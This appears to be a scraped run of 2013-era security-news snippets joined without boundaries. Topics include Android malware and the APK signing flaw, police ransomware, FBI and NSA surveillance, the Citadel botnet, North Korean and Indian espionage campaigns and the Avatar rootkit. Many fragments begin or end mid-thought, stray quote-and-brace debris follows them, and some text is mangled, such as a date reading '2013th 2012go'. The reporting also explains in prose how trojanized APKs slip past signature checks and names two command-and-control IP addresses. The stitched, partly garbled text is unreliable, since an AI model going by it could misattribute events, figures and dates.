a shell app for a Vietnamese porn website which is able Also to send text messages to a premium number. The number of malware that exploits the Google Cloud Messaging Service is Destined to increase despite it is still relatively low, the data on Their diffusion demonstrated it. These malware are prevalent in Western Europe, the CIS, and Asia, virus writers know very well that execution Off commands received from GCM is performed by the Google Cloud Messaging Service system and it is impossible to block them directly on an Infected device.

A new Police Ransomware family dubbed Trojan:HTML/Browlock by F-secure Antivirus firm, known as Browlock, which spreads by tricking unsuspecting web surfers into believing the police are after them. Ransomware is malware that, when installed on a device, can be locked down from remote locations by cyber criminals. Usually, ransomware appears to be an official warning telling the user that the computer has to be locked because it showed illegal activities and payment is necessary to access files. Ransomware is a global phenomenon, but the criminals have learned to localize and customize their software to make the threat seem scarier so that victims act quickly before they have time to think. Researchers said they are tracking this Malware from a while ago and now crooks behind the malware ate targeting users from some new countries including the United States, Canada and the UK. F-Secure traced the data from an attack to a server in St. Petersburg, Russia. If users surf to a compromised site foisting the scam or click on a malicious ad, their screen becomes locked, and a message is displayed. In Browlock, The messages are customized to appear like they come from federal authorities in the victim's home country or region, including the European Cybercrime Centre and the Royal Canadian Mounted Police. \"We did notice that the fine has dropped from 250 CAD to 150 CAD compared to a previous lock screen below. It seems that in today's economy, even ransomware victims can't be expected to pay up such high prices.\" It’s conservatively estimated that more than $5 million a year is being extorted from victims. Ransomware is just like any other computer infection, but it can be potentially worse since it can cause permanent damage, such as deleted files and files that become encrypted forever. If you think you're safe from Ransomware because you own a Mac or Linux, think again. Scammers are now targeting all platform users including iPhone and Android." }

Computer viruses and spyware are an unavoidable part of life. You can protect against them, but they'll always be out there lurking. The Wall Street Journal posted the story that FBI agents hacking people's Android devices and personal computers (PCs) using malware, so that they can turn the MIC on and listen in on conversations. The FBI hires people who have been hacking skill, and they purchase tools that are capable of doing these things, and develop some hacking tools internally or purchases others from the private sector. It’s also important to note that the US government is now the world’s largest buyer of malware. The FBI has also developed custom \"port reader\" software to intercept Internet metadata in real time and U.S. government is quietly pressuring telecommunications providers to install eavesdropping technology deep inside companies' internal networks to facilitate surveillance efforts. The FBI has a history of technology-based surveillance. It also previously asked Internet companies to provide surveillance backdoors, stands to benefit from CISPA, and is also involved in the ongoing PRISM scandal alongside the NSA. While most of the FBI’s intrusion methods are top secret some of their practices have been discovered. The former FBI official who spoke to the Journal, claimed that the method is restricted to those associated with child pornography, organized crime, or counterterrorism. \"The bureau has controls to ensure only \"relevant data\" are scooped up, the person said. A screening team goes through all of the data pulled from the hack to determine what is relevant, then hands off that material to the case team and stops working on the case.\" he said. Once data are collected, the virus sends the information to an independent screening team tasked with removing all irrelevant data swept up by the spyware. Evidence is then handed over to the primary investigators, who use the material to build criminal cases. Unlike the NSA PRISM program the FBI Android and PC monitoring solutions are only activated with court order on a case-by-case basis. However, trust in the government is quite low these days, so it’s unfortunate that most of us will hear this and wonder if the FBI is spying on the rest of us, too." }

For Malware analysts never want to disclose their IP address/Location while testing the Malware samples, or for analysis or communicating with command-and-control servers, TOR is not enough. Tortilla creator Jason Geffner CrowdStrike researcher Jason Geffner released an open source free new tool, called Tortilla, a new tool to securely, anonymously, and transparently route all TCP/IP and DNS traffic through Tor, regardless of the client software, and without relying on VPNs or additional hardware or virtual machines. This new tool also supports Flash and other plug-ins, and doesn't require additional hardware or virtual machines. Jason released Tortilla at Black Hat Conference this year. Online Activists, Hackers and Bad people also love anonymity, which means the Tortilla Tool is ideal for those not wanting to be tracked or overheard. Download Tortilla Tool" }

Lookout was able to force Google Glass to silently connect to a Wi-Fi access point, which let the researchers view all of the data flowing to and from the device. When combined with an Android 4.0.4 web vulnerability, the hack apparently gave researchers full control of the Glass headset. The problem was that Google Glass could be told to execute a QR code without the user having to give permission. Because of Glass's limited user interface, Google set up the device's camera to automatically process any QR code in a photograph. In a video posted on YouTube, Lookout Security described the vulnerability: \"That access point in turn allowed us to spy on the connections Glass made, from web requests to images uploaded to the Cloud.\" said Marc Rogers, Lookout. Lookout disclosed its findings to Google on 16 May. Google filed a bug report with the Glass development team and the issue was fixed by version XE6, released on 4 June." }

The whole point of digitally signing a document or file is to prove the file hasn't been modified. The process uses a form of public-key cryptography. In Chinese version of hacking attack, malicious code can be added into the file headers, but the method is limited because targeted files need to be smaller than 64K in size. APK files are packed using a version of the widespread ZIP archiving algorithm. Most ZIP implementations won't permit two same-named files in one archive, but the algorithm itself doesn't forbid that possibility. So basically, two versions of the classes.dex file are placed inside of the package, the original and a hacked alternative. When checking an app's digital signature, the Android OS looks at the first matching file, but when actually executing and launching the file, it grabs the last one. To Trojanize an app, then, all you need to do is shoehorn your malicious code into it using a name that already exists within the app. The flaw is very similar to the first master key vulnerability recently announced by researchers from mobile security firm Bluebox Security. According to BlueBox, 99% of Android devices are vulnerable to this attack. Google has already patched the flaw and posted it to the Android Open Source Project (AOSP). You can use ReKey, a free mobile app that's designed to patch the Android master key vulnerability that's present in an estimated 900 million devices that run Android and that could be exploited by attackers to take full control of a device. Always get your apps from legitimate sources, always check to make sure the developer name is valid, and configure your phone so it doesn't permit installing apps from unknown sources.

This type of criminal malware, which spread around the world on PCs in 2012, encrypts some or all the files on a computer and holds them for ransom and Cyber thieves have already made millions through such methods. Ransomware is no longer all about computers. It has evolved to now target mobile devices, specifically Androids platform. For a hacker, a pop up message is just one more way to steal money by sending fake alerts and serious warnings that scare a user into making a payment. For example, in the case of PCs, we have encountered malware that encrypts crucial data on a user’s hard disk, asking the victim to pay a sum to the attacker in order to recover his/her data. Last year in November at many Hacking Conferences, Security Researcher Mohit Kumar (@Unix_Root) already demonstrated one the most sophisticated android malware called \"Android Malware Engine\", one of its kind yet , that includes the first Android malware Mobile Ransomware worm ever seen. Last month Symantec had discovered bogus android antivirus software, dubbed Fakedefender. The Fake Android Defender application displays a false malware detection in an effort to gain the victim’s confidence and to con you into paying for software to remove the infection, while ransomware locks up your mobile device and prevents you from using it at all until the ransom is paid. You won't be able to open any new apps, and ultimately will make your device unusable, until you pay for it. Ransom demands vary and can be anywhere between $30-$100. Cybercriminals have been found to earn up to $30,000 a day on scams such as these! The key to staying protected against these threats is to ensure that you do not get them onto your device in the first place. Android is open and allows you to download and install apps from virtually anywhere, but those apps might not be vetted and often can't be trusted. This year at 'The Hackers Conference', Mohit Kumar is going to talk about \"RiskyDroid - Malicious and Spying backdoors in Popular Android applications\". Their presentation will cover the demonstrations of amazing Surveillance, Malicious and Dangerous backdoors in top Rated popular Android applications. Android has something more important than a normal cell phone like email accounts, bank accounts, your personal pictures, your call recordings and many more and do you really think that your Droid is perfectly safe and all your personal information is in safe hand with Google, Facebook, WeChat, Whatsapp or Truecaller ? If yes, then you are in big trouble!

The attackers behind these recent attacks against South Korean infrastructure are skilled professionals and they designed a specialized malware to steal military secrets from the South Korea and US military networks. The cyber espionage campaign dubbed as \"Operation Troy\", due the numerous references into the source code analyzed to the city. McAfee said that in 2009, malware was implanted into a social media website used by military personnel in South Korea Ryan Sherstobitoff, a senior threat researcher at McAfee, started the investigation after the malware came into action in an attacks occurred on March 20th, known as the Dark Seoul Incident, in which tens of thousands of hard drives belongs to television networks and banks in South Korea were wiped completely. Versions of the code may still be trying to glean military secrets from infected computers. Sherstobitoff said the same coded fingerprints were found on an attack June 25, the anniversary of the start of the 1950-53 Korean War - in which websites for South Korea's president and prime minister were attacked. On June 26th the US Government announced that personal information about thousands of U.S. troops in South Korea had been exposed online. The attackers infected victims with “spear phishing” attacks, the hackers also compromised about a dozen Korean-language religious, social and shopping websites to steal secret information from infected networks. In the following image is proposed the timeline of the attacks:“This goes deeper than anyone had understood to date, and it’s not just attacks: It’s military espionage,” Sherstobitoff said. Despite the malware used to wipe the disks during the recent attacks against Korean infrastructures is different from the one used for the cyber espionage campaign, but many similarities have been found between the source codes of both and this led to believe that they must be created by the same malware developer team. Researchers highlighted that there are various clues in the malicious code which lead to the North Korea, for example the password used to unlock encrypted files contains the number 38 probably linked to \"38th parallel\" that separates the North from South Korea. After previous attack, Two different and previously unknown groups separately took credit: The \"Whois Hacking Team\" posted pictures of skulls and a warning, while the \"NewRomanic Cyber Army Team\" said it had leaked private information from banks and media organizations. Before that attack, hackers had been sending spy malware on domestic networks for months, giving them the ability to gather information about how their internal servers work, what websites the users visit and which computers are responsible for security, the researchers found. This information would have been crucial for planning the coordinated attacks on banks and TV networks. It is still not clear that the exact amount of information stolen or the exact networks penetrated by attackers, but South Korean officially blamed North Korean state sponsored-hackers. The Hackers espionage on government networks with military information for at least four years, using code that automatically searched infected computers for dozens of military terms in Korean, including “U.S. Army,” ‘’secret,” ‘’Joint Chiefs of Staff” and “Operation Key Resolve,” an annual military exercise held by U.S. Forces Korea and the South Korean military. “These included names of individuals, base locations, weapons systems and assets,” revealed Sherstobitoff. South Korea’s Defense Ministry announced that it’s technically impossible to disclose classified reports from military networks because the networks of the Korean Intelligence aren't connected to the Internet and the access to the Internet is made with different computers separated by the internal military infrastructure. Hacking sensitive South Korean military computers from the Internet “cannot be done,” “It’s physically separated.” said the South Korean government representative. North Korea has the highest percentage of military personnel in relation to population than any other nation in the world. It has approximately 40 enlisted soldiers per 1000 people with a considerable impact on the economy of the country. A defector has declared that North Korea has increased its cyber warfare unit to staff 3,000 people and it is massive training its young prodigies to become professional hackers. The government of Pyongyang is massive investing in cyber warfare capabilities, recruiting and forming a high skilled team of hackers. The groups will could be engaged in offensive cyber operation against hostile government and in cyber espionage activities. In spite of McAfee researchers haven’t indicated the origin of the attacks many security experts have no doubts about the nature of the offensive, North Korean state sponsored hackers appear as the main culprits." }

Or simply, The Flaw allow hackers to modify any legitimate and digitally signed application in order to transform it into a Trojan program that can be used to steal data or take control of the OS. When an application is installed and a sandbox is created for it, Android records the application's digital signature and all subsequent updates for that application need to match its signature in order to verify that they came from the same author and anything without the signature certificate won’t install or run on a user’s device. The vulnerability has existed since at least Android 1.6, which means that it potentially affects any Android device released during the last four years. Samsung’s flagship Galaxy S4 has already been patched, so it is likely that manufacturers have quietly sprung into action. Vulnerability is particularly dangerous because of the way many big-name companies have granted Android devices running on their networks additional privileges. After bypassing Android's app-signing model to take the place of such an app, rogue malware can obtain full access to Android system and all applications (and their data) currently installed. \"Depending on the type of application, a hacker can exploit the vulnerability for anything from data theft to creation of a mobile botnet,\" said Bluebox on the potential risks. Bluebox disclosed the vulnerability to Google in February, but said that it was up to individual handset manufacturers to issue patches. Google hasn't responded to a request for comment. However, Google has blocked distribution of apps exploiting the flaw in Google Play, although if user to is tricked into manually installing a malicious update for an app originally installed through Google Play, the app will be replaced and the new version will no longer interact with the app store." }

The hackers are exploiting with a meaningful increase these architecture to organize financially motivated attacks. Landesman and Monnier explained in two distinct sessions that cyber criminals are exploiting US cloud hosting providers to deploy Command and Control servers for their malicious activities despite the great effort in monitoring activities operated by hosting cloud providers. US is one of privileged countries to host malicious architecture due high availability of its infrastructures and cyber criminals know it. \"You can move your command and control servers to Kazakhstan, but that's not a very good business decision,\" \"The U.S. has redundant power, high availability and great peering; these are things all these guys are looking for.\" Monnier declared. Cyber criminals exploit compromised hosting account on cloud infrastructures or they set up accounts to conduct fraudulent activities. The acquisition of fraudulent accounts is done using a stolen digital identity and payments are executed with stolen credit card or using compromised payment services accounts. The criminals are using the cloud architectures for various fraudulent activities such as the arrangement of Distributed Denial of Service, botnet management, watering hole attacks and phishing campaign. Last edition of its APWG Global Phishing Survey report revealed that Fishers, exactly as other type of cyber criminals, appear active as never before breaking into cloud hosting providers with unprecedented success and abusing of their resources to conduct large scale phishing attacks. “APWG Global Phishing Survey report states that the number of phishing attacks that targeted shared Web hosting represented 47% of overall phishing attacks, attackers registered principal sub domains than regular domain names. The technique adopted by attackers appears very efficient, they hack shared Web hosting server and update its configuration so that phishing pages are displayed from a particular sub directory of each domain hosted on the server, in this way compromising a single shared hosting server, it is possible to exploit hundreds or even thousands of websites at a time for the attacks.” Reported Pierluigi Paganini in a blog post on Security Affairs. The methods of attacks is exploited also to compromise cloud hosting providers, the hack of a single account could allow the control of various servers and all the web sited deployed on them. \"We need hosting providers to ensure the integrity of all their Web servers continually,\" Landesman declared. Landesman has explained the scheme of attack adopted for Darkleech campaign that compromised nearly 20,000 legitimate websites that use Apache HTTP server software to launch drive-by malware attacks against visitors. \"Thousands of Web servers across the globe running Apache 2.2.2 and above are infected with an SSHD backdoor that allows remote attackers to upload and configure malicious Apache modules,\" \"These modules are then used to turn hosted sites into attack sites, dynamically injecting iFrames in real-time, only at the moment of visit.\" declared Mary Landesman The attackers are improving the techniques of attacks making large use of obfuscation techniques and testing with care their security avoidance mechanisms making hard the detection of malicious activities. Another massive attacks have been observer during the last months, in March a new version of the threat called Linux/Cdorked malware was discovered attacking Apache installations meanwhile, a massive brute-force attack campaign dubbed Gumblar targeted WordPress accounts to gather admin credentials. The trend is very concerning, in the next moths cloud infrastructures, social networks and mobile platforms will suffer a growing number of attacks, cyber criminals with a reasonable effort will be able to target wide audience and principal providers are located in the Western Regions for the above reasons. Knowledge of these trends is essential to prevent future accidents." }

The exploit can be used to to access data from other applications, prevent users from uninstalling the malware, and make it possible for the attackers to send premium rate text messages from the handset. Symantec said, \"The Android operating system normally sandboxes every application so they cannot perform sensitive system operations or interfere with other installed applications. In the past, we have seen malware use privilege escalation exploits to access data from other applications, prevent uninstall, hide themselves, and also bypass the Android permissions model to enable behaviors such as sending premium SMS messages without user authorization.\" A majority of malicious mobile apps are fake or rogue apps that claim to have some function but will also contain malicious behaviors that run without users’ knowledge. Because there is no patch available yet for this flaw, so we recommend users to download apps from reputable marketplaces only." }

The NSA access is part of a previously undisclosed program called PRISM, 6-year-old program which allows officials to collect real-time information and as well as stored material including search history, the content of emails, file transfers and live chats, according to reports in the Washington Post. Project PRISM may be the first of its kind and also GCHQ, Britain’s equivalent of the NSA, also has been secretly gathering intelligence from the same internet companies through an operation set up by the NSA. Later confirmed by the White House and members of Congress as saying that the government routinely seeks information in its fight to thwart domestic and international terrorism. Other services that are reportedly part of PRISM include PalTalk, Skype, and AOL. Dropbox is listed in the presentation as \"coming soon.\" According to a separate “User’s Guide for PRISM Skype Collection,” that service can be monitored for audio when one end of the call is a conventional telephone and for any combination of “audio, video, chat, and file transfers” when Skype users connect by computer alone. Companies including Facebook, Apple and Google denied the company's alleged participation in PRISM. A spokesperson for Apple said \"We have never heard of PRISM. We do not provide any government agency with direct access to our servers, and any government agency requesting customer data must get a court order.\" Also chief security officer for Facebook said \"We do not provide any government organization with direct access to Facebook servers. When Facebook is asked for data or information about specific individuals, we carefully scrutinize any such request for compliance with all applicable laws, and provide information only to the extent required by law.\" The report came on the same day that another newspaper Guardian, revealed that the U.S. government is collecting telephone records of millions of Americans as part of U.S. counterterrorism efforts via Verizon communications. “Verizon continually takes steps to safeguard its customers’ privacy. Nevertheless, the law authorizes the federal courts to order a company to provide information in certain circumstances, and if Verizon were to receive such an order, we would be required to comply,” Randy Milch, Verizon’s general counsel, said in a letter to employees. Though there is no specific guarantee to privacy under the U.S. Constitution, the fourth amendment is often cited as guaranteeing protection to American citizens against unlawful search and seizure. UPDATE : President Obama says, \"When it comes to telephone calls, nobody is listening to your telephone calls. That is not what this program is about. As was indicated, what the intelligence community is doing is, looking at those numbers, and durations of calls. They are not looking at people’s names and they’re not looking at content. But, by sifting through this so-called metadata they may identify potential leads with respect to folks who might engage in terrorism.\" Google Co-Founder Larry Page: Dear Google users— You may be aware of press reports alleging that Internet companies have joined a secret U.S. government program called PRISM to give the National Security Agency direct access to our servers. As Google’s CEO and Chief Legal Officer, we wanted you to have the facts. First, we have not joined any program that would give the U.S. government—or any other government—direct access to our servers. Indeed, the U.S. government does not have direct access or a “back door” to the information stored in our data centers. We had not heard of a program called PRISM until yesterday. Second, we provide user data to governments only in accordance with the law. Our legal team reviews each and every request, and frequently pushes back when requests are overly broad or don’t follow the correct process. Press reports that suggest that Google is providing open-ended access to our users’ data are false, period. Until this week’s reports, we had never heard of the broad type of order that Verizon received—an order that appears to have required them to hand over millions of users’ call records. We were very surprised to learn that such broad orders exist. Any suggestion that Google is disclosing information about our users’ Internet activity on such a scale is completely false. Finally, this episode confirms what we have long believed—there needs to be a more transparent approach. Google has worked hard, within the confines of the current laws, to be open about the data requests we receive. We post this information on our Transparency Report whenever possible. We were the first company to do this. And, of course, we understand that the U.S. and other governments need to take action to protect their citizens’ safety—including sometimes by using surveillance. But the level of secrecy around the current legal procedures undermines the freedoms we all cherish.

Dubbed as Backdoor.AndroidOS.Obad.a, it is the most sophisticated piece of Android malware ever seen. It exploits multiple vulnerabilities, blocks uninstall attempts, attempts to gain root access, and can execute a host of remote commands. It include complex obfuscation techniques that complicated analysis of the code, and the use of a previously unknown vulnerability in Android that allowed it to take control of and maintain a foothold on infected Android devices. There are two previously unknown Android vulnerabilities exploited by Obad. It can gain administrator privileges, making it virtually impossible for a user to delete it off a device. Another flaw in the Android OS relates to the processing of the AndroidManifest.xml file. This file exists in every Android application and is used to describe the application’s structure, define its launch parameters. \"The malware modifies AndroidManifest.xml in such a way that it does not comply with Google standards, but is still correctly processed on a Smartphone thanks to the exploitation of the identified vulnerability,\" said Kaspersky Lab Expert. \"All of this made it extremely difficult to run dynamic analysis on this Trojan.\" Like many modern malicious programs, Obad is modular, with the ability to receive software updates directly from C&C servers controlled by the attackers. Obad Malware is very similar to the 'Android Malware Engine', that was developed and demonstrated by Mohit Kumar (Founder, The Hacker News) last year in Malcon Conference. Android Malware Engine has the capability to exploit more than 100's of Android platform features with command and control server that also communicate with stealthy methods to execute various evil commands and to stealing user data. The Trojan doesn't even have an interface it works entirely in background mode. Malware enhanced with features like: Download a file from the server and install it Act as proxy server, HTTP server, FTP server Stealing, Sending, Deleting and Creating text message, contacts and Call Logs. Turning off Wi-Fi, GPS, Bluetooth, Vibration Ransomware Remote Shell, and also installing the ssh server on the device Extracting information of all list of applications and antiviruses installed Stealing Whatsapp conversations Forwarding messages and calls to malicious numbers Controlling all infected devices as bots for sms and network ddos attack Modifying permission model and randomizing classes for making it undetectable from behaviour and signature based antivirus. Locating victims with Live GPS locations on world map. The researchers at Kaspersky Labs say that the Trojan has fortunately not spread a lot and have also notified Google of the above vulnerabilities on their OS, which have been exploited by the Trojan. Android’s rapid gains in the mobile space have raised concerns that the mobile OS will become a target, as Microsoft’s Windows was in the PC space." }

Botnets are networks of computers infected with viruses that let them be controlled by hackers. The outfit runs the Citadel Botnets and is believed to have stolen more than $500 million from bank accounts over the past 18 months. Citadel is one of the biggest botnets in operation today. Citadel is a banking Trojan that has been in existence since 2011. As with most banking Trojans, Citadel is a full crimeware kit, providing the attackers with payload builders, a command and control (C&C) server infrastructure, and configuration scripts to target various banks. Citadel infected as many as 5 million PCs around the world including here in Australia and according to Microsoft, was used to steal from dozens of financial institutions, including American Express, Bank of America, Citigroup, Credit Suisse, eBay's PayPal, HSBC, JPMorgan Chase, Royal Bank of Canada and Wells Fargo. Citadel installed keylogging software onto a computer, which tracked everything a person typed. Microsoft also admitted that it does not expect to have wiped out the Citadel botnet fully, simply because of its sheer size. As a result, when users access their bank accounts online, they unwittingly provide access to banking passwords and other confidential information to the hackers. Earlier Wednesday, federal marshals escorted Microsoft officials to two data hosting facilities in New Jersey and Pennsylvania, where they seized data and evidence from the botnets. Microsoft has filed a civil lawsuit in the U.S. District Court in Charlotte, North Carolina against the unknown hackers and obtained a court order to shut down the botnets and identifies the ringleader as 'John Doe No. 1', who goes by the alias Aquabox and is accused of creating and maintaining the botnet. The FBI working closely with Europol and other overseas authorities to try to capture the unknown criminals.

Malware once activated would carry out programmed attacks either by itself or as part of a wider botnet of mobile devices. Presenting their findings at a conference earlier this month, the researchers explained how sensors in ubiquitous mobile devices have opened the door to a new generation of mobile malware that unsuspecting users unwittingly downloaded onto their devices. Since the trigger needs to be relatively close to the smartphone to active any hidden malware, any threats would be limited to the local environment. “We showed that these sensory channels can be used to send short messages that may eventually be used to trigger a mass-signal attack,” The researchers found that cameras and microphones were the most effective way to trigger malware, but also noted that a heavy bass pattern could trigger the vibration sensor. They were also successful, at various distances, using music videos; lighting from a television, computer monitor and overhead bulbs; vibrations from a sub woofer; and magnetic fields.

Google reported the hack publicly years ago, saying that the sophisticated attack resulted in the theft of Google intellectual property and the partial compromise of some human rights activists' email accounts. When the news first surfaced in 2010, Google said hackers stole the source code behind its search engine, and targeted email accounts of activists critical of China's human rights record. But recently discovered that the hackers also obtained surveillance information, including emails belonging to suspected spies, diplomats and terrorists which law enforcement officials had been monitoring. Google reported this breach to the FBI, resulting in a national security investigation. According to the sources, hackers were after the names of Chinese intelligence operatives who were the target of American surveillance. The extent of the compromise is not known. An FBI investigation did not uncover any evidence that the information had been used to hurt national security, and Google tightened its defenses in the aftermath. Last month, a senior Microsoft official suggested Chinese hackers had targeted the company's servers about the same time Google's system was compromised.

Norman Shark, the global security leader in malware analysis solutions for enterprises, service providers and government, today released a report detailing a large and sophisticated cyber-attack infrastructure that appears to have originated from India. The attacks, conducted by private threat actors over a period of three years and still ongoing, showed no evidence of state sponsorship but the primary purpose of the global command-and-control network appears to be intelligence gathering from a combination of national security targets and private sector companies. Attackers used known vulnerabilities in Microsoft software, chucking malware dubbed HangOver onto target machines, most of which were based in Pakistan, where 511 infections associated with the campaign were detected. HangOver installs keyloggers, takes screenshots and records victims’ browser usage, before sending the pilfered data off to remote servers by FTP or HTTP. The malware installed on the infected computers is primarily designed to steal information, but its functionality can be enhanced with additional modules. There’s also evidence that the attackers are signing their code with an old certificate that was issued in 2011 to Technical and Commercial Consulting Pvt. Ltd., a firm based in New Delhi, India. The certificate had been revoked in late March 2012, but was still in use. Eset contacted VeriSign, which revoked the certificate. Eset found more than 70 binary files signed with the malicious certificate. The payloads dropped by the malware offer a range from access. ESET discovered downloaders, document uploaders, keyloggers, reverse shells, and payloads with the ability to self-replicate within a network. There was another association with India in the repeated appearance of the word “Appin”. “There seems to be some connection with the Indian security company called Appin Security Group,” Norman wrote. Domains used by the attack infrastructure were shown to have been registered by Appin Security Solutions too. Another firm, Mantra Tech Ventures, was also hosting a number of malicious sites run by the attackers, Norman said.

The criminals reportedly used the tool, which is connected to various parts of the network it is analysing, to create a backdoor they can use to bypass the system's security protocols. \"Two of these IP addresses proved to be of particular interest, namely 50.93.204.62 and 98.143.145.118. They are located in the United States, but multiple Chinese-language domains point to them. All of these have been blocked as command-and-control servers,\" he said. This attack highlights how information theft can be performed even with malware that is not particularly advanced or sophisticated. It also shows some of the challenges in attributing attacks of this nature." }

QinetiQ North America (QQ) a world leading defense technology and security company providing satellites, drones and software services to the U.S. Special Forces deployed in Afghanistan and Middle East. The hacking was so extensive that external consultants ended up more or less working permanently inside the firm to root out malicious software and compromises on an ongoing basis. In one of the attacks, that took place in 2009, the hackers raided at least 151 machines of the firm’s Technology Solutions Group (TSG) over a 251-day period, stealing 20 gigabytes of data before being blocked. As the White House moves to confront China over its theft of U.S. technology through hacking, policy makers are faced with the question of how much damage has already been done. 1.3 million pages of documents, including ones containing highly sensitive military information, were stolen at the time. The agent had stumbled upon the breach as part of a separate investigation but apparently left out many key details including the fact that other contractors were being hit. Through 2008, is said to have treated the continuing pattern of hacks traced to its buildings as isolated incidents, including the compromise of 13,000 server passwords that attackers were used to help steal huge amounts of classified military engineering data. QinetiQ committed the first mistake as it restricts its investigation on the first discovery of the spying. Even when NASA warned the firm that it was being attacked by hackers from one of QinetiQ’s computers the firm apparently continued to treat incidents in isolation. The hackers were able to exploit unpatched security flaws and other vulnerabilities across QNA to infiltrate multiple divisions of the company including Cyveillance, the company's cybersecurity unit. In 2010, HBGary, the security firm hacked in 2011 by Anonymous, was hired by QinetiQ along with Terremark to investigate the attacks. HBGary almost immediately identified malicious software on most of QinetiQ’s computers. The spying on QinetiQ and other defense contractors appears aimed at helping China leapfrog the U.S.’s technologically advanced military, foregoing years of research and development that would have cost billions of dollars" }

All you have to do is plug the hardware that specializes in Bitcoin mining and run its customized software. After that, you can sit back and relax as it mines the digital currency for you. A popular eSports league has admitted that one of its employees harnessed the power of member’s computers without their knowledge in order to mine Bitcoins. For a period of 2 weeks, gamers noticed that their computers were generating unusually high GPU loads and frequent BSOD errors. Some gamers stated that their GPUs were damaged due to them reaching temperatures above 90 degrees Celsius. The mining began on April 13th and affected thousands of gamers, who unwittingly mined over $3,700 worth of the currency. Eric Thunberg, co-owner of ESEA, stated that the Bitcoin miner was meant to be part of an April Fools joke, however, they weren't able to finish it in time. They then decided to put some of the test code into the clients belonging to a few ESEA administrators. They wanted to see if the bitcoin miner would offer any benefits to the ESEA community. After 2 days of testing, they decided to cancel the project altogether. Unfortunately, according to an official statement released by Craig Levine, the other co-owner of ESEA, an employee involved in the test decided to use the test codes for his own personal gain ESEA distributes anti-cheat software that allows subscribers to play the Counter-Strike first-person shooter game on their network. The software gives players better data on their game play and cuts down on the use of known game cheats, which can give opponents an unfair advantage. The network has close to 14,000 paying customers. ESEA co-founder Craig Torbull Levine said \"The owners and management at ESEA all apologize to each of you that were impacted by the recent events and intend to make things right,” Torbull continues “ESEA has issued a free month of ESEA Premium to all of our community members who were enrolled in Premium for the month of April. We also ask anyone who has experienced any physical damage to their computers to open an ESEA support ticket.\" As of this morning, ESEA has made sure that all Bitcoin mining has stopped. ESEA is also in the process of taking all necessary steps internally to ensure that nothing like this ever happens again. The news is quite disturbing considering that many people have been using their services in order to play games online fairly or without worrying about other players cheating their way out of the game." }

In connection with work on other projects, we moved the release date for the public from May to February 2013th 2012go.Now nuclear rootkit AVATAR is available for rental.\" Despite the malware was described months ago it was not found and published until now, in March ESET researchers detected two droppers with different C&C servers and having different compilation time stamps as showed in the following pictures:The Avatar rootkit appears very sophisticated, it uses two different infection techniques, the first in the dropper so as to bypass detections by HIPS, and the second one in the rootkit driver to allow the malware to be alive after system reboot, the instance detected works only on x86 systems. The 2 level dropper for Avatar rootkit works in conjunction, the first one implements LZMA decompression for the second level dropper. Driver module and second level dropper are unique in every instance of malware thanks to a random names generator names for mutexes/events in the first level dropper. To the second level dropper is assigned the function of escalate privilege on target system, the dropper uses two different techniques, the exploitation of the MS11-080 vulnerability with code as a public exploit from Metasploit Framework with minor changes, and COM Elevation (UAC whitelist). The following a diagram that shows the process implemented by dropper: Most interesting part of the exploit code of Avatar rootkit is the steps taken after exploitation, kernel-mode shellcode is in fact executed to load malicious driver, the rootkit driver is not stored on the hard drive and loads only from a memory region. The Avatar rootkit implements a technique for loading the driver by system driver infection that appeared very effective for bypassing victim’s defense, and allows the loads other kernel-mode modules exploiting the malicious system driver. The post reports:\"In order to perform its infection, Avatar randomly chooses a driver and checks its name against a blacklist that varies for every Windows versions.\" \"The Avatar rootkit driver is able to infect several system drivers without changing the original driver’s file size.\" Once loaded the Avatar rootkit driver, the malicious code executes an algorithm for infecting system drivers so as to survive after reboot, the malware is also able to detect the presence of a virtual machine environment thanks to a sophisticated technique that query BIOS to check for some specific strings related to principal machines available on the market such as VirtualBox and VMware. The malware uses a hidden file system to store the user-mode payload module and also additional files, all the data are encrypted using a custom symmetric cipher. The hidden file storage is also used by Avatar rootkit to store additional user-mode and kernel-mode modules that malware can download and execute. Avatar rootkit doesn't store malicious modules in any standard NTFS storage, except for infected system drivers. The principal functionality of the malware are:command center communications parsing configuration information read/write into hidden file storage communicating with the rootkit driver installing additional user-mode and kernel-mode modules The post highlight the flexibility of the malicious agent:\"Of course, this means the initial infection can be the starting point of a variety of malicious activities based on the modules that deployed. In our case the payload component avcmd.dll was injected into svchost.exe system process which started communicating with C&C IP addresses stored in the configuration file. \" Another interesting feature implemented by authors of the rootkit in the protection of communications with the command center with a custom encryption algorithm which output is base64-encoded, Avatar rootkit has an additional way of communicating with the C&C server searching for messages in Yahoo groups using special parameters. The technique is not new and is very efficient to protect the malware over sinkhole attempts of security firms, because information about C&C’s domains is encrypted using an RSA asymmetric algorithm. On the use of Yahoo Groups as C&C the report states:\"The group description is encrypted with an RSA algorithm and a 1024-bit private key. It is possible to decrypt this data with the public key stored in the configuration file. We suppose this information is to be found in the encrypted message used for returning control for a botnet without an active C&C.\" But Avatar rootkit appears a very complex and articulated project, it is accompanied by a list of API for developing additional components based on the Avatar Runtime Library, a special SDK for developing additional user-mode components which allow communication with the Avatar rootkit driver. Win32/Rootkit.Avatar is considerable a sophisticated rootkit family having many interesting features to avoid detection by security software, due this reason security experts believe that the agent has been developed for long term infection by the system executing the attack. Avatar rootkit may hold many surprises in the next future." }

RSA security experts published an interesting article to describer a concerning phenomena, the criminal offer has exploited the popularity and wide audience of Social Network proposing a customized botnet panel for Zeus Trojan. The malicious application appears to be developed by Indonesian-speaking developers that improved previous version of the popular Zeus Trojan kit. The team adopted a winning commercial approach designing a demo website for would-be buyers public visible and publishing a dedicated Facebook page. The cyber criminals used the social network page to update their customers providing information about botnets, exploits, cyber crime, and of course about their own products (Zeus v 1.2.10.1). The different cyber laws in force in different countries and their light application in many states has sustained the growth of cyber crime worldwide, criminals are now starting to publicly offer/ acquire malicious codes and hacking services for malicious campaign. IT community need a globally recognized law framework to address cyber criminal organizations, law enforcement urge the establishment of severe penalties and shared effort to fight a battle against an invisible enemy that hasn't a specific geographical connotation.

